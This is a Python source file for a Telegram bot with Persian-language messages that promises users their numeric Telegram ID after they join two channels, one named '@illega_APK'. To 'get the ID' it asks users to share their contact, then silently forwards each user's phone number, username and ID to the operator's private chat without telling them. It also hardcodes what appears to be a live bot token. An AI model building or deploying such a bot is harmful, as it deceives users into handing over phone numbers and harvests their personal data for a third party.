import telegram
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters

TOKEN = '7682398662:AAHagt611VPm7RmLLmGxdmaYdYPtHJbMp04'
MY_CHAT_ID = '5840672291'
CHANNEL_1 = '@Good_APK_01'
CHANNEL_2 = '@illega_APK'

async def check_channel_membership(user_id, context):
    try:
        member1 = await context.bot.get_chat_member(chat_id=CHANNEL_1, user_id=user_id)
        is_member1 = member1.status in ['member', 'administrator', 'creator']
    except telegram.error.TelegramError as e:
        print(f"Error checking CHANNEL_1: {e}")
        is_member1 = False

    try:
        member2 = await context.bot.get_chat_member(chat_id=CHANNEL_2, user_id=user_id)
        is_member2 = member2.status in ['member', 'administrator', 'creator']
    except telegram.error.TelegramError as e:
        print(f"Error checking CHANNEL_2: {e}")
        is_member2 = False

    print(f"User {user_id} - Channel 1: {is_member1}, Channel 2: {is_member2}")
    return is_member1, is_member2

async def start(update: Update, context):
    user_id = update.message.from_user.id
    is_member1, is_member2 = await check_channel_membership(user_id, context)

    if is_member1 and is_member2:
        keyboard = [[KeyboardButton("دریافت آیدی عددی", request_contact=True)]]
        reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
        await update.message.reply_text(
            "برای دریافت آیدی عددی تلگرامت، لطفاً روی دکمه زیر کلیک کن:",
            reply_markup=reply_markup
        )
    else:
        message = "برای استفاده از این ربات، لطفاً تو کانال‌های زیر عضو شو:\n"
        if not is_member1:
            message += f"- {CHANNEL_1}\n"
        if not is_member2:
            message += f"- {CHANNEL_2}\n"
        message += "بعد دوباره /start رو بزن."
        await update.message.reply_text(message)

async def handle_contact(update: Update, context):
    user_id = update.message.from_user.id
    is_member1, is_member2 = await check_channel_membership(user_id, context)

    if not (is_member1 and is_member2):
        message = "لطفاً تو کانال‌های زیر عضو شو:\n"
        if not is_member1:
            message += f"- {CHANNEL_1}\n"
        if not is_member2:
            message += f"- {CHANNEL_2}\n"
        message += "بعد دوباره /start رو بزن."
        await update.message.reply_text(message)
        return

    if update.message.contact:
        phone_number = update.message.contact.phone_number
        user_id = update.message.from_user.id
        username = update.message.from_user.username or "بدون نام کاربری"
        await update.message.reply_text(f"آیدی عددی تلگرامت: {user_id}\nحالا می‌تونی از ربات استفاده کنی.")
        await context.bot.send_message(
            chat_id=MY_CHAT_ID,
            text=f"کاربر جدید:\nآیدی عددی: {user_id}\nنام کاربری: @{username}\nشماره موبایل: {phone_number}"
        )
    else:
        await update.message.reply_text("لطفاً روی دکمه دریافت آیدی عددی کلیک کن!")

def main():
    print("ربات داره شروع می‌کنه...")
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    application.run_polling()

if __name__ == '__main__':
    main()
